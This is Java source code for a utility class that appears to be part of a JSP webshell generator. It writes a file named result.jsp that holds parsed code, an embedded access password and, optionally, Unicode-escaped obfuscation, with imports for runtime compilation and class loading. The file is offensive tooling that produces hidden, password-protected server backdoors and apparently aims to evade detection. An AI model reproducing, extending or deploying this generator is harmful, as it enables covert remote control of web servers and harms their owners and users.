package org.sec.util;

import com.github.javaparser.ast.body.MethodDeclaration;

@SuppressWarnings("all")
public class WriteUtil {
    public static void writeSuper(MethodDeclaration method,MethodDeclaration decMethod,
                                  String password,boolean useUnicode){
        String prefix = "<%@ page import=\"java.net.URL\" %>\n" +
                "<%@ page import=\"java.net.URLClassLoader\" %>\n" +
                "<%@ page import=\"java.nio.charset.Charset\" %>\n" +
                "<%@ page import=\"java.nio.file.Files\" %>\n" +
                "<%@ page import=\"java.nio.file.Paths\" %>\n" +
                "<%@ page import=\"java.util.Locale\" %>\n" +
                "<%@ page import=\"javax.tools.DiagnosticCollector\" %>\n" +
                "<%@ page import=\"javax.tools.JavaCompiler\" %>\n" +
                "<%@ page import=\"javax.tools.JavaFileObject\" %>\n" +
                "<%@ page import=\"javax.tools.StandardJavaFileManager\" %>\n" +
                "<%@ page import=\"javax.tools.ToolProvider\" %>\n" +
                "<%@ page import=\"java.util.Random\" %>\n" +
                "<%@ page import=\"java.io.File\" %>";
        try {
            String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
            String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
            String decCode = decMethod.toString();
            if (code != null && decCode != null) {
                String source = code.substring(1, code.length() - 2);
                String newCode = compactCode(source);
                String newDecCode = compactCode(decCode);
                if (useUnicode) {
                    newCode = UnicodeUtil.encodeString(newCode);
                    newDecCode = UnicodeUtil.encodeString(newDecCode);
                    String output = prefix + passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
                    FileUtil.writeFile("result.jsp", output);
                } else {
                    String output = prefix + passwordCode + "<%!" + decCode + "%><%" + source + " %>";
                    FileUtil.writeFile("result.jsp", output);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void write(MethodDeclaration method, MethodDeclaration decMethod,
                             String password, boolean useUnicode) {
        try {
            String prefix = "<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>";
            String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
            String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
            String decCode = decMethod.toString();
            if (code != null && decCode != null) {
                String source = code.substring(1, code.length() - 2);
                String newCode = compactCode(source);
                String newDecCode = compactCode(decCode);

                if (useUnicode) {
                    newCode = UnicodeUtil.encodeString(newCode);
                    newDecCode = UnicodeUtil.encodeString(newDecCode);
                    String output = prefix + passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
                    FileUtil.writeFile("result.jsp", output);
                } else {
                    String output = prefix + passwordCode + "<%!" + decCode + "%><%" + source + " %>";
                    FileUtil.writeFile("result.jsp", output);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String compactCode(String input) {
        String[] codes = input.split(System.getProperty("line.separator"));
        StringBuilder codeBuilder = new StringBuilder();
        for (String c : codes) {
            codeBuilder.append(c.trim());
        }
        return codeBuilder.toString().trim();
    }
}
